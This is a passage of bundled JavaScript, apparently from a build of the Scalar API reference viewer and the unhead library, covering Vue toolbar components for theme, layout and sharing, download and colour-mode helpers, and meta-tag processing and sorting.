	inheritAttrs: false,
	__name: "ScalarThemeSwatches",
	props: { css: {} },
	setup(__props) {
		const { colors } = useThemeSwatches(() => __props.css);
		const { cx } = useBindCx();
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", mergeProps({ style: {
				"--bg-light": unref(colors).light["--scalar-background-1"],
				"--bg-dark": unref(colors).dark["--scalar-background-1"]
			} }, unref(cx)("flex *:size-3 overflow-hidden rounded", "bg-(--bg-light) dark:bg-(--bg-dark)")), [(openBlock(true), createElementBlock(Fragment, null, renderList(unref(THEME_CSS_VARS), (v) => {
				return openBlock(), createElementBlock("div", {
					key: v,
					class: "bg-(--bg-light) dark:bg-(--bg-dark)",
					style: normalizeStyle({
						"--bg-light": unref(colors).light[v],
						"--bg-dark": unref(colors).dark[v]
					})
				}, null, 4);
			}), 128))], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarConfigTheme.vue.script.js
var _hoisted_1$5 = { class: "min-w-0 flex-1 truncate text-left" };
var _hoisted_2$3 = { class: "text-c-1 inline-block min-w-0 flex-1 truncate" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarConfigTheme.vue.js
var ApiReferenceToolbarConfigTheme_default = /* @__PURE__ */ defineComponent({
	__name: "ApiReferenceToolbarConfigTheme",
	props: {
		"modelValue": {},
		"modelModifiers": {}
	},
	emits: ["update:modelValue"],
	setup(__props) {
		const model = useModel(__props, "modelValue");
		const options = computed(() => themeIds.filter((id) => id !== "none").map((id) => ({
			id,
			label: themeLabels[id],
			css: presets[id].theme
		})));
		const selected = computed({
			get: () => {
				const theme = model.value ?? "default";
				return options.value.find((o) => o.id === theme) ?? options.value[0];
			},
			set: (option) => model.value = option.id
		});
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(ScalarCombobox_default), {
				modelValue: selected.value,
				"onUpdate:modelValue": _cache[0] || (_cache[0] = ($event) => selected.value = $event),
				options: options.value,
				resize: ""
			}, {
				default: withCtx(({ open }) => [createVNode(unref(ScalarFormInput_default), null, {
					default: withCtx(() => [
						createBaseVNode("div", _hoisted_1$5, toDisplayString(selected.value.label), 1),
						createVNode(unref(ScalarThemeSwatches_default), {
							class: "mr-2",
							css: selected.value.css
						}, null, 8, ["css"]),
						createVNode(unref(ScalarIconCaretDown_default), { class: normalizeClass(["size-3.5 transition-transform", { "rotate-180": open }]) }, null, 8, ["class"])
					]),
					_: 2
				}, 1024)]),
				option: withCtx(({ selected, option }) => [
					createVNode(unref(ScalarListboxCheckbox_default), { selected }, null, 8, ["selected"]),
					createBaseVNode("span", _hoisted_2$3, toDisplayString(option.label), 1),
					createVNode(unref(ScalarThemeSwatches_default), { css: option.css }, null, 8, ["css"])
				]),
				_: 1
			}, 8, ["modelValue", "options"]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ModifyConfiguration.vue.script.js
var _hoisted_1$4 = { class: "flex flex-col gap-4" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ModifyConfiguration.vue.js
var ModifyConfiguration_default = /* @__PURE__ */ defineComponent({
	__name: "ModifyConfiguration",
	props: /*@__PURE__*/ mergeModels({ configuration: {} }, {
		"overrides": {},
		"overridesModifiers": {}
	}),
	emits: ["update:overrides"],
	setup(__props) {
		const overrides = useModel(__props, "overrides");
		const { translate } = useLocalization();
		const snippet = computed(() => {
			return prettyPrintJson({
				...overrides.value,
				...__props.configuration,
				...overrides.value
			});
		});
		const theme = computed({
			get: () => overrides.value?.theme ?? __props.configuration?.theme ?? "default",
			set: (t) => overrides.value = {
				...overrides.value,
				theme: t
			}
		});
		const layout = computed({
			get: () => overrides.value?.layout ?? __props.configuration?.layout ?? "modern",
			set: (l) => overrides.value = {
				...overrides.value,
				layout: l
			}
		});
		return (_ctx, _cache) => {
			return openBlock(), createBlock(ApiReferenceToolbarPopover_default, { class: "w-120" }, {
				label: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.configure")), 1)]),
				default: withCtx(() => [createVNode(unref(ScalarFormSection_default), null, {
					label: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.scalarConfiguration")), 1)]),
					default: withCtx(() => [createVNode(unref(ScalarCodeBlock_default), {
						class: "bg-b-1.5 flex max-h-40 flex-col rounded border text-sm",
						content: snippet.value,
						lang: "json"
					}, null, 8, ["content"])]),
					_: 1
				}), createBaseVNode("div", _hoisted_1$4, [
					createVNode(unref(ScalarFormField_default), null, {
						label: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.theme")), 1)]),
						default: withCtx(() => [createVNode(ApiReferenceToolbarConfigTheme_default, {
							modelValue: theme.value,
							"onUpdate:modelValue": _cache[0] || (_cache[0] = ($event) => theme.value = $event)
						}, null, 8, ["modelValue"])]),
						_: 1
					}),
					createVNode(unref(ScalarFormField_default), null, {
						label: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.layout")), 1)]),
						default: withCtx(() => [createVNode(ApiReferenceToolbarConfigLayout_default, {
							modelValue: layout.value,
							"onUpdate:modelValue": _cache[1] || (_cache[1] = ($event) => layout.value = $event)
						}, null, 8, ["modelValue"])]),
						_: 1
					}),
					createVNode(unref(ScalarFormField_default), { is: "div" }, {
						label: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.layoutOptions")), 1)]),
						default: withCtx(() => [createVNode(ApiReferenceToolbarConfigLayoutOptions_default, {
							modelValue: overrides.value,
							"onUpdate:modelValue": _cache[2] || (_cache[2] = ($event) => overrides.value = $event),
							configuration: __props.configuration
						}, null, 8, ["modelValue", "configuration"])]),
						_: 1
					})
				])]),
				_: 1
			});
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarShareTemporary.vue.js
var ApiReferenceToolbarShareTemporary_default = /* @__PURE__ */ defineComponent({
	__name: "ApiReferenceToolbarShareTemporary",
	props: /*@__PURE__*/ mergeModels({
		workspace: {},
		externalUrls: {}
	}, {
		"url": {},
		"urlModifiers": {}
	}),
	emits: ["update:url"],
	setup(__props) {
		const { toast } = useToasts();
		const loader = useLoadingState();
		const { translate } = useLocalization();
		const tempDocUrl = useModel(__props, "url");
		async function generateTemporaryLink() {
			if (loader.isLoading || !__props.workspace || !!tempDocUrl.value) return;
			loader.start();
			const document = __props.workspace.exportActiveDocument("json");
			if (!document) {
				toast(translate("developerTools.unableToExportDocument"), "error");
				await loader.invalidate();
				return;
			}
			try {
				const url = await uploadTempDocument(document, __props.externalUrls);
				await loader.validate({
					duration: 900,
					persist: true
				});
				tempDocUrl.value = url;
			} catch (error) {
				const message = error instanceof Error ? error.message : translate("developerTools.unknownError");
				toast(message, "error");
				await loader.invalidate();
			}
		}
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock(Fragment, null, [tempDocUrl.value ? (openBlock(), createBlock(unref(ScalarTextInputCopy_default), {
				key: 0,
				immediate: "",
				modelValue: tempDocUrl.value,
				name: "temporary-link",
				placeholder: `${__props.externalUrls.registryUrl}/share/apis/…`
			}, null, 8, ["modelValue", "placeholder"])) : (openBlock(), createBlock(unref(ScalarButton_default), {
				key: 1,
				class: "h-auto p-2.5",
				loader: unref(loader),
				variant: "gradient",
				onClick: generateTemporaryLink
			}, {
				default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.uploadDocument")), 1)]),
				_: 1
			}, 8, ["loader"])), createVNode(ApiReferenceToolbarBlurb_default, { class: "-mt-1" }, {
				default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.temporaryLinkExpiration")), 1)]),
				_: 1
			})], 64);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ShareApiReference.vue.script.js
var _hoisted_1$3 = { class: "text-c-2 mb-2 leading-normal" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ShareApiReference.vue.js
var ShareApiReference_default = /* @__PURE__ */ defineComponent({
	__name: "ShareApiReference",
	props: {
		workspace: {},
		externalUrls: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		return (_ctx, _cache) => {
			return openBlock(), createBlock(ApiReferenceToolbarPopover_default, { class: "w-120" }, {
				label: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.share")), 1)]),
				default: withCtx(() => [createVNode(unref(ScalarFormSection_default), null, {
					label: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.shareTitle")), 1)]),
					default: withCtx(() => [createBaseVNode("p", _hoisted_1$3, toDisplayString(unref(translate)("developerTools.shareDescription")), 1), createVNode(ApiReferenceToolbarShareTemporary_default, {
						externalUrls: __props.externalUrls,
						workspace: __props.workspace
					}, null, 8, ["externalUrls", "workspace"])]),
					_: 1
				})]),
				_: 1
			});
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/DeveloperTools.vue.script.js
var _hoisted_1$2 = ["aria-label"];
var _hoisted_2$2 = { class: "-mx-2 flex max-w-(--refs-content-max-width) flex-1 items-center" };
var _hoisted_3$2 = { class: "flex flex-1 items-center" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/DeveloperTools.vue.js
var DeveloperTools_default = /* @__PURE__ */ defineComponent({
	__name: "DeveloperTools",
	props: /*@__PURE__*/ mergeModels({
		workspace: {},
		configuration: {},
		externalUrls: {}
	}, {
		"overrides": {},
		"overridesModifiers": {}
	}),
	emits: ["update:overrides"],
	setup(__props) {
		const overrides = useModel(__props, "overrides");
		const { translate } = useLocalization();
		const showDeveloperTools = computed(() => {
			if (__props.configuration?.showDeveloperTools === "always") return true;
			if (__props.configuration?.showDeveloperTools === "never") return false;
			if (typeof window === "undefined") return false;
			return isLocalUrl(window.location.href);
		});
		return (_ctx, _cache) => {
			return showDeveloperTools.value ? (openBlock(), createElementBlock("header", {
				key: 0,
				"aria-label": unref(translate)("developerTools.title"),
				class: "api-reference-toolbar bg-b-1 relative z-1 flex h-10 justify-center border-b px-15"
			}, [createBaseVNode("div", _hoisted_2$2, [
				createBaseVNode("div", _hoisted_3$2, [createVNode(ApiReferenceToolbarTitle_default)]),
				createVNode(ModifyConfiguration_default, {
					overrides: overrides.value,
					"onUpdate:overrides": _cache[0] || (_cache[0] = ($event) => overrides.value = $event),
					configuration: __props.configuration
				}, null, 8, ["overrides", "configuration"]),
				__props.workspace ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [createVNode(ShareApiReference_default, {
					externalUrls: __props.externalUrls,
					workspace: __props.workspace
				}, null, 8, ["externalUrls", "workspace"]), createVNode(DeployApiReference_default, {
					externalUrls: __props.externalUrls,
					workspace: __props.workspace
				}, null, 8, ["externalUrls", "workspace"])], 64)) : createCommentVNode("", true)
			])], 8, _hoisted_1$2)) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/multiple-documents/DocumentSelector.vue.script.js
var _hoisted_1$1 = { class: "overflow-hidden text-base text-ellipsis" };
var _hoisted_2$1 = { class: "min-w-0 flex-1 truncate" };
var _hoisted_3$1 = { class: "overflow-hidden text-base text-ellipsis" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/multiple-documents/DocumentSelector.vue.js
var DocumentSelector_default = /* @__PURE__ */ defineComponent({
	__name: "DocumentSelector",
	props: {
		options: {},
		modelValue: {}
	},
	emits: ["update:modelValue"],
	setup(__props, { emit: __emit }) {
		const props = __props;
		const emit = __emit;
		const { translate } = useLocalization();
		const isPointerInteraction = ref(false);
		useEventListener("keydown", () => {
			isPointerInteraction.value = false;
		});
		const formattedOptions = computed(() => props.options.map((o) => ({
			id: o.id,
			label: o.label
		})));
		const selected = computed(() => formattedOptions.value.find((o) => o.id === props.modelValue));
		return (_ctx, _cache) => {
			return __props.options.length > 1 ? (openBlock(), createElementBlock("div", {
				key: 0,
				class: "document-selector px-3 pt-3",
				onPointerdownCapture: _cache[2] || (_cache[2] = ($event) => isPointerInteraction.value = true)
			}, [__props.options.length > 5 ? (openBlock(), createBlock(unref(ScalarCombobox_default), {
				key: 0,
				inputLabel: unref(translate)("search.inputLabel"),
				modelValue: selected.value,
				noResults: unref(translate)("search.noResults"),
				options: formattedOptions.value,
				placeholder: unref(translate)("search.placeholder"),
				resize: "",
				"onUpdate:modelValue": _cache[0] || (_cache[0] = (e) => e && emit("update:modelValue", e.id))
			}, {
				default: withCtx(({ open }) => [createBaseVNode("button", {
					class: normalizeClass(["group/dropdown-label text-c-2 hover:text-c-1 flex w-full cursor-pointer items-center gap-1 rounded font-medium focus-visible:outline-offset-4", { "outline-none": isPointerInteraction.value }]),
					type: "button"
				}, [createBaseVNode("span", _hoisted_1$1, toDisplayString(selected.value?.label || "Select API"), 1), createVNode(unref(ScalarIconCaretDown_default), {
					class: normalizeClass(["size-3 text-current transition-transform", { "rotate-180": open }]),
					weight: "bold"
				}, null, 8, ["class"])], 2)]),
				option: withCtx(({ option }) => [createBaseVNode("span", _hoisted_2$1, toDisplayString(option.label), 1)]),
				_: 1
			}, 8, [
				"inputLabel",
				"modelValue",
				"noResults",
				"options",
				"placeholder"
			])) : (openBlock(), createBlock(unref(ScalarListbox_default), {
				key: 1,
				modelValue: selected.value,
				options: formattedOptions.value,
				resize: "",
				"onUpdate:modelValue": _cache[1] || (_cache[1] = (e) => emit("update:modelValue", e.id))
			}, {
				default: withCtx(({ open }) => [createBaseVNode("button", {
					class: normalizeClass(["group/dropdown-label text-c-2 hover:text-c-1 flex w-full cursor-pointer items-center gap-1 rounded font-medium focus-visible:outline-offset-4", { "outline-none": isPointerInteraction.value }]),
					type: "button"
				}, [createBaseVNode("span", _hoisted_3$1, toDisplayString(selected.value?.label || "Select API"), 1), createVNode(unref(ScalarIconCaretDown_default), {
					class: normalizeClass(["size-3 text-current transition-transform", { "rotate-180": open }]),
					weight: "bold"
				}, null, 8, ["class"])], 2)]),
				_: 1
			}, 8, ["modelValue", "options"]))], 32)) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/build-models-index.js
/**
* Builds a mapping from model names to their sidebar entry IDs.
*
* The map powers the `scroll-to:model-by-name` navigation used by model-name links
* (for example the `Satellite[]` link next to a property type, or a request-body model name).
*
* Model entries do not always live under the top-level `models` group: a component schema with an
* `x-tags` extension is placed under its tag group instead. To keep those links working we walk the
* whole navigation tree and collect every `type === 'model'` entry, wherever it lives.
*
* @see https://github.com/scalar/scalar/issues/9854
*/
var buildModelsIndex = (entries) => {
	const index = {};
	const collect = (items) => {
		for (const item of items) {
			if (item.type === "model") index[item.name] ??= item.id;
			if ("children" in item && item.children?.length) collect(item.children);
		}
	};
	collect(entries);
	return index;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/color-mode.js
/**
* Gets the system color mode preference from the browser.
* Falls back to 'light' if running in a non-browser environment.
*
* @returns The system preference for dark or light mode.
*/
var getSystemModePreference = () => {
	if (typeof window === "undefined" || typeof window?.matchMedia !== "function") return "light";
	return window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/download.js
/**
* Create a click event that works in both browser and test environments
*/
function createClickEvent() {
	try {
		return new MouseEvent("click", {
			bubbles: true,
			cancelable: true,
			view: window
		});
	} catch {
		return new MouseEvent("click", {
			bubbles: true,
			cancelable: true
		});
	}
}
/**
* Parse YAML or JSON content into a JavaScript object
*/
async function parseContent(content) {
	try {
		return JSON.parse(content);
	} catch {
		const { parse } = await import("./browser-8PVv9PKY.js").then((n) => n.n);
		return parse(content, {
			maxAliasCount: 1e4,
			merge: true
		});
	}
}
/**
* Detect if content is JSON or YAML using lightweight string heuristics
* to avoid the cost of a full JSON.parse call.
*/
function detectFormat(content) {
	const trimmed = content.trimStart();
	if (trimmed.startsWith("{") || trimmed.startsWith("[")) return "json";
	return "yaml";
}
/**
* Convert content to the target format, returning the original string when
* no conversion is needed so that YAML comments, custom formatting, and key
* ordering are preserved.
*/
async function formatContent(content, inputFormat, outputFormat) {
	if (inputFormat === outputFormat) return content;
	const parsed = await parseContent(content);
	if (outputFormat === "json") return JSON.stringify(parsed, null, 2);
	const { stringify } = await import("./browser-8PVv9PKY.js").then((n) => n.n);
	return stringify(parsed);
}
/**
* Trigger the download of the OpenAPI document
*/
async function downloadDocument(content, filename, format) {
	const inputFormat = detectFormat(content);
	const outputFormat = format ?? inputFormat;
	const contentFilename = `${filename ?? "openapi"}.${outputFormat}`;
	const mimeType = outputFormat === "json" ? "application/json" : "application/x-yaml";
	const formattedContent = await formatContent(content, inputFormat, outputFormat);
	const blob = new Blob([formattedContent], { type: mimeType });
	const data = URL.createObjectURL(blob);
	const link = document.createElement("a");
	link.href = data;
	link.download = contentFilename;
	link.dispatchEvent(createClickEvent());
	setTimeout(() => {
		window.URL.revokeObjectURL(data);
		link.remove();
	}, 100);
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/load-from-perssistance.js
/**
* Loads the default HTTP client from storage and applies it to the workspace.
* Only updates if no default client is already set. Accepts both built-in client
* ids and custom sample ids (e.g. `custom/python`) so a custom selection persists.
*/
var loadClientFromStorage = (store) => {
	const storedClient = clientStorage().get();
	if (r$1(storedClient) && !store.workspace["x-scalar-default-client"]) store.update("x-scalar-default-client", storedClient);
};
/**
* Loads the authentication data from storage and applies it to the workspace.
* Only updates if no authentication data is already set.
*/
var loadAuthFromStorage = (store, slug) => {
	const auth = authStorage().getAuth(slug);
	store.auth.load({ [slug]: auth });
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/map-config-plugins.js
/**
* Maps API reference configuration callbacks to client plugins.
*
* This function transforms the onBeforeRequest, onRequestBuilt, onResponseReceived, and onRequestSent
* callbacks into the new plugin hook system. The mapping is reactive, so changes
* to the configuration will automatically update the plugin hooks.
*
* Note: onRequestBuilt is mapped to the requestBuilt hook so the callback receives
* the exact fetch Request that is sent over the wire. Mutating its headers modifies
* the outgoing request, and hashing its body produces a hash that matches what the
* server receives (a rebuilt multipart body would get a different boundary).
*
* Note: onRequestSent is mapped to responseReceived hook. This is not a perfect
* one-to-one mapping, but it maintains backward compatibility with the old API.
* The old callback receives only the URL string, while the new hook receives
* the full response object.
*
* @param config - Reactive configuration object containing optional hook callbacks
* @returns Array containing a single plugin with the mapped hooks
*/
var mapConfigPlugins = (config, environment) => {
	const plugin = { hooks: {} };
	watch([
		() => config.value.onBeforeRequest,
		() => config.value.onRequestBuilt,
		() => config.value.onRequestSent,
		() => config.value.onResponseReceived,
		() => environment.value
	], ([onBeforeRequest, onRequestBuilt, onRequestSent, onResponseReceived, environment]) => {
		const envVariables = getEnvironmentVariables(environment);
		if (!plugin.hooks) plugin.hooks = {};
		plugin.hooks.beforeRequest = onBeforeRequest ? async (payload) => {
			const built = buildRequest(payload.requestBuilder, {
				envVariables,
				allowMissingRequestServerBase: true
			});
			if (!built.ok) {
				console.error("[@scalar/api-reference] onBeforeRequest was not run because the request could not be built:", built.message ?? built.error);
				return;
			}
			await onBeforeRequest({
				request: buildSafeBodyRequest(...built.data.requestPayload),
				requestBuilder: payload.requestBuilder,
				envVariables
			});
		} : void 0;
		/**
		* Maps onRequestBuilt to the requestBuilt hook. The payload request is the
		* exact fetch Request that will be sent, so header mutations apply and body
		* hashes match what goes over the wire.
		*/
		plugin.hooks.requestBuilt = onRequestBuilt ? async (payload) => {
			await onRequestBuilt({
				request: payload.request,
				requestBuilder: payload.requestBuilder,
				envVariables
			});
		} : void 0;
		/**
		* Maps onRequestSent to responseReceived hook.
		* The old API only passed the URL string, so we extract it from the request.
		*/
		plugin.hooks.responseReceived = onRequestSent || onResponseReceived ? (payload) => {
			onRequestSent?.(payload.request.url);
			return onResponseReceived?.({
				response: payload.response,
				request: payload.request
			});
		} : void 0;
	}, { immediate: true });
	return [plugin];
};
//#endregion
//#region node_modules/unhead/dist/shared/unhead.AvDFlk_u.mjs
var DupeableTags = /* @__PURE__ */ new Set([
	"link",
	"style",
	"script",
	"noscript"
]);
var TagsWithInnerContent = /* @__PURE__ */ new Set([
	"title",
	"titleTemplate",
	"script",
	"style",
	"noscript"
]);
var HasElementTags = /* @__PURE__ */ new Set([
	"base",
	"meta",
	"link",
	"style",
	"script",
	"noscript"
]);
var ValidHeadTags = /* @__PURE__ */ new Set([
	"title",
	"base",
	"htmlAttrs",
	"bodyAttrs",
	"meta",
	"link",
	"style",
	"script",
	"noscript"
]);
var UniqueTags = /* @__PURE__ */ new Set([
	"base",
	"title",
	"titleTemplate",
	"bodyAttrs",
	"htmlAttrs",
	"templateParams"
]);
var TagConfigKeys = /* @__PURE__ */ new Set([
	"key",
	"tagPosition",
	"tagPriority",
	"tagDuplicateStrategy",
	"innerHTML",
	"textContent",
	"processTemplateParams"
]);
var UsesMergeStrategy = /* @__PURE__ */ new Set([
	"templateParams",
	"htmlAttrs",
	"bodyAttrs"
]);
var MetaTagsArrayable = /* @__PURE__ */ new Set([
	"theme-color",
	"google-site-verification",
	"og",
	"article",
	"book",
	"profile",
	"twitter",
	"author"
]);
var hasContent = (value) => typeof value === "number" ? Number.isFinite(value) : value;
//#endregion
//#region node_modules/unhead/dist/shared/unhead.h_KkEIE6.mjs
var NAMESPACES = {
	META: /* @__PURE__ */ new Set(["twitter"]),
	OG: /* @__PURE__ */ new Set([
		"og",
		"book",
		"article",
		"profile",
		"fb"
	]),
	MEDIA: /* @__PURE__ */ new Set([
		"ogImage",
		"ogVideo",
		"ogAudio",
		"twitterImage"
	]),
	HTTP_EQUIV: /* @__PURE__ */ new Set([
		"contentType",
		"defaultStyle",
		"xUaCompatible"
	])
};
var META_ALIASES = {
	articleExpirationTime: "article:expiration_time",
	articleModifiedTime: "article:modified_time",
	articlePublishedTime: "article:published_time",
	bookReleaseDate: "book:release_date",
	fbAppId: "fb:app_id",
	ogAudioSecureUrl: "og:audio:secure_url",
	ogAudioUrl: "og:audio",
	ogImageSecureUrl: "og:image:secure_url",
	ogImageUrl: "og:image",
	ogSiteName: "og:site_name",
	ogVideoSecureUrl: "og:video:secure_url",
	ogVideoUrl: "og:video",
	profileFirstName: "profile:first_name",
	profileLastName: "profile:last_name",
	profileUsername: "profile:username",
	msapplicationConfig: "msapplication-Config",
	msapplicationTileColor: "msapplication-TileColor",
	msapplicationTileImage: "msapplication-TileImage"
};
var MetaPackingSchema = {
	appleItunesApp: { unpack: {
		entrySeparator: ", ",
		resolve: ({ key, value }) => `${fixKeyCase(key)}=${value}`
	} },
	refresh: {
		metaKey: "http-equiv",
		unpack: {
			entrySeparator: ";",
			resolve: ({ key, value }) => key === "seconds" ? `${value}` : void 0
		}
	},
	robots: { unpack: {
		entrySeparator: ", ",
		resolve: ({ key, value }) => typeof value === "boolean" ? fixKeyCase(key) : `${fixKeyCase(key)}:${value}`
	} },
	contentSecurityPolicy: {
		metaKey: "http-equiv",
		unpack: {
			entrySeparator: "; ",
			resolve: ({ key, value }) => `${fixKeyCase(key)} ${value}`
		}
	},
	charset: {}
};
function fixKeyCase(key) {
	const updated = key.replace(/([A-Z])/g, "-$1").toLowerCase();
	const prefixIndex = updated.indexOf("-");
	return prefixIndex === -1 ? updated : NAMESPACES.META.has(updated.slice(0, prefixIndex)) || NAMESPACES.OG.has(updated.slice(0, prefixIndex)) ? key.replace(/([A-Z])/g, ":$1").toLowerCase() : updated;
}
function sanitizeObject(input) {
	return Object.fromEntries(Object.entries(input).filter(([k, v]) => String(v) !== "false" && k));
}
function transformObject(obj) {
	return Array.isArray(obj) ? obj.map(transformObject) : !obj || typeof obj !== "object" ? obj : Object.fromEntries(Object.entries(obj).map(([k, v]) => [fixKeyCase(k), transformObject(v)]));
}
function unpackToString(value, options = {}) {
	const { entrySeparator = "", keyValueSeparator = "", wrapValue, resolve } = options;
	return Object.entries(value).map(([key, val]) => {
		if (resolve) {
			const resolved = resolve({
				key,
				value: val
			});
			if (resolved !== void 0) return resolved;
		}
		const processedVal = typeof val === "object" ? unpackToString(val, options) : typeof val === "number" ? val.toString() : typeof val === "string" && wrapValue ? `${wrapValue}${val.replace(new RegExp(wrapValue, "g"), `\\${wrapValue}`)}${wrapValue}` : val;
		return `${key}${keyValueSeparator}${processedVal}`;
	}).join(entrySeparator);
}
function handleObjectEntry(key, value) {
	const sanitizedValue = sanitizeObject(value);
	const fixedKey = fixKeyCase(key);
	const attr = resolveMetaKeyType(fixedKey);
	if (!MetaTagsArrayable.has(fixedKey)) return [{
		[attr]: fixedKey,
		...sanitizedValue
	}];
	return unpackMeta(Object.fromEntries(Object.entries(sanitizedValue).map(([k, v]) => [`${key}${k === "url" ? "" : `${k[0].toUpperCase()}${k.slice(1)}`}`, v])) || {}).sort((a, b) => (a[attr]?.length || 0) - (b[attr]?.length || 0));
}
function resolveMetaKeyType(key) {
	if (MetaPackingSchema[key]?.metaKey === "http-equiv" || NAMESPACES.HTTP_EQUIV.has(key)) return "http-equiv";
	const fixed = fixKeyCase(key);
	const colonIndex = fixed.indexOf(":");
	return colonIndex === -1 ? "name" : NAMESPACES.OG.has(fixed.slice(0, colonIndex)) ? "property" : "name";
}
function resolveMetaKeyValue(key) {
	return META_ALIASES[key] || fixKeyCase(key);
}
function resolvePackedMetaObjectValue(value, key) {
	if (key === "refresh") return `${value.seconds};url=${value.url}`;
	return unpackToString(transformObject(value), {
		keyValueSeparator: "=",
		entrySeparator: ", ",
		resolve: ({ value: value2, key: key2 }) => value2 === null ? "" : typeof value2 === "boolean" ? key2 : void 0,
		...MetaPackingSchema[key]?.unpack
	});
}
function unpackMeta(input) {
	const extras = [];
	const primitives = {};
	for (const [key, value] of Object.entries(input)) {
		if (Array.isArray(value)) {
			if (key === "themeColor") {
				value.forEach((v) => {
					if (typeof v === "object" && v !== null) extras.push({
						name: "theme-color",
						...v
					});
				});
				continue;
			}
			for (const v of value) if (typeof v === "object" && v !== null) {
				const urlProps = [];
				const otherProps = [];
				for (const [propKey, propValue] of Object.entries(v)) {
					const meta2 = unpackMeta({ [`${key}${propKey === "url" ? "" : `:${propKey}`}`]: propValue });
					(propKey === "url" ? urlProps : otherProps).push(...meta2);
				}
				extras.push(...urlProps, ...otherProps);
			} else extras.push(...typeof v === "string" ? unpackMeta({ [key]: v }) : handleObjectEntry(key, v));
			continue;
		}
		if (typeof value === "object" && value) {
			if (NAMESPACES.MEDIA.has(key)) {
				const prefix = key.startsWith("twitter") ? "twitter" : "og";
				const type = key.replace(/^(og|twitter)/, "").toLowerCase();
				const metaKey = prefix === "twitter" ? "name" : "property";
				if (value.url) extras.push({
					[metaKey]: `${prefix}:${type}`,
					content: value.url
				});
				if (value.secureUrl) extras.push({
					[metaKey]: `${prefix}:${type}:secure_url`,
					content: value.secureUrl
				});
				for (const [propKey, propValue] of Object.entries(value)) if (propKey !== "url" && propKey !== "secureUrl") extras.push({
					[metaKey]: `${prefix}:${type}:${propKey}`,
					content: propValue
				});
			} else if (MetaTagsArrayable.has(fixKeyCase(key))) extras.push(...handleObjectEntry(key, value));
			else primitives[key] = sanitizeObject(value);
		} else primitives[key] = value;
	}
	const meta = Object.entries(primitives).map(([key, value]) => {
		if (key === "charset") return { charset: value === null ? "_null" : value };
		const metaKey = resolveMetaKeyType(key);
		const keyValue = resolveMetaKeyValue(key);
		const processedValue = value === null ? "_null" : typeof value === "object" ? resolvePackedMetaObjectValue(value, key) : typeof value === "number" ? value.toString() : value;
		return metaKey === "http-equiv" ? {
			"http-equiv": keyValue,
			"content": processedValue
		} : {
			[metaKey]: keyValue,
			content: processedValue
		};
	});
	return [...extras, ...meta].map((m) => !("content" in m) ? m : m.content === "_null" ? {
		...m,
		content: null
	} : m);
}
//#endregion
//#region node_modules/unhead/dist/shared/unhead.ChXiQvI8.mjs
// @__NO_SIDE_EFFECTS__
function isUnsafeKey(key) {
	return key === "__proto__" || key === "constructor" || key === "prototype";
}
var sortTags = (a, b) => a._w === b._w ? a._p - b._p : a._w - b._w;
var TAG_WEIGHTS = {
	base: -10,
	title: 10
};
var TAG_ALIASES = {
	critical: -8,
	high: -1,
	low: 2
};
var WEIGHT_MAP = {
	meta: {
		"content-security-policy": -30,
		"charset": -20,
		"viewport": -15
	},
	link: {
		"preconnect": 20,
		"stylesheet": 60,
		"preload": 70,
		"modulepreload": 70,
		"prefetch": 90,
		"dns-prefetch": 90,
		"prerender": 90
	},
	script: {
		async: 30,
		defer: 80,
		sync: 50
	},
	style: {
		imported: 40,
		sync: 60
	}
};
var ImportStyleRe = /@import/;
var isTruthy = (val) => val === "" || val === true;
function tagWeight(head, tag) {
	if (typeof tag.tagPriority === "number") return tag.tagPriority;
	let weight = 100;
	const offset = TAG_ALIASES[tag.tagPriority] || 0;
	const weightMap = head.resolvedOptions.disableCapoSorting ? {
		link: {},
		script: {},
		style: {}
	} : WEIGHT_MAP;
	if (tag.tag in TAG_WEIGHTS) weight = TAG_WEIGHTS[tag.tag];
	else if (tag.tag === "meta") {
		const metaType = tag.props["http-equiv"] === "content-security-policy" ? "content-security-policy" : tag.props.charset ? "charset" : tag.props.name === "viewport" ? "viewport" : null;
		if (metaType) weight = WEIGHT_MAP.meta[metaType];
	} else if (tag.tag === "link" && tag.props.rel) weight = weightMap.link[tag.props.rel];
	else if (tag.tag === "script") {
		const type = String(tag.props.type);
		if (isTruthy(tag.props.async)) weight = weightMap.script.async;
		else if (tag.props.src && !isTruthy(tag.props.defer) && !isTruthy(tag.props.async) && type !== "module" && !type.endsWith("json") || tag.innerHTML && !type.endsWith("json")) weight = weightMap.script.sync;
		else if (isTruthy(tag.props.defer) && tag.props.src && !isTruthy(tag.props.async) || type === "module") weight = weightMap.script.defer;
